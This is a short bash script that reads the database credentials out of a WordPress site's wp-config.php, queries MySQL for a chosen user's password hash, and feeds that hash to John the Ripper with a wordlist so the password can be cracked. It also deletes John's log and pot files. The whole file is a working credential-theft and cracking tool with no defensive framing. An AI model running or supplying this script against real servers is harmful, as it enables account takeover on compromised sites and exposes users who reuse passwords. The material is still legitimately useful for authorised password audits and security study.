#!/bin/bash

searchuser=0
WPDIR=/var/www
DB_TABLE="wp_users"
JOHNDIR="/tmp/john-1.7.6-jumbo-12-Linux64/run"
WORDLIST="/tmp/wordlist.txt"

help() {
	echo "Usage: $0 [-h] [-w WORDLIST] [-j JOHNDIR] [-t DB_TABLE] [-d WEBDIR] -u WPUSER" 1>&2
}

while getopts "hw:j:t:d:u:" options; do
	case "${options}" in
		w)
			WORDLIST=${OPTARG}
			;;
		h)
			help
			exit 1
			;;
		j)
			JOHNDIR=${OPTARG}
			;;
		t)
			DB_TABLE=${OPTARG}
			;;
		d)
			WPDIR=${OPTARG}
			;;
		u)
			searchuser=${OPTARG}
			;;
		:)
			echo "$0: Must supply an argument to -$OPTARG." >&2
			exit 1
			;;
	esac
done

if [ $searchuser == 0 ]
then
	help
	echo
	echo "Please provide a WPUSER"
	echo
	exit 1
fi

WPCONFIGFILE=`find $WPDIR -name wp-config.php`

DB_NAME=`grep DB_NAME $WPCONFIGFILE | awk -F "'" '{print $4}'`
DB_USER=`grep DB_USER $WPCONFIGFILE | awk -F "'" '{print $4}'`
DB_PASSWORD=`grep DB_PASSWORD $WPCONFIGFILE | awk -F "'" '{print $4}'`


RESULT=$(mysql --raw --silent -u$DB_USER -p$DB_PASSWORD $DB_NAME -e "select user_pass from $DB_TABLE WHERE user_login=\"$searchuser\"")

HASHFILE=`mktemp`

echo $RESULT >  $HASHFILE

cd $JOHNDIR
rm john.{log,pot}
./john --wordlist=$WORDLIST $HASHFILE

rm $HASHFILE
cd

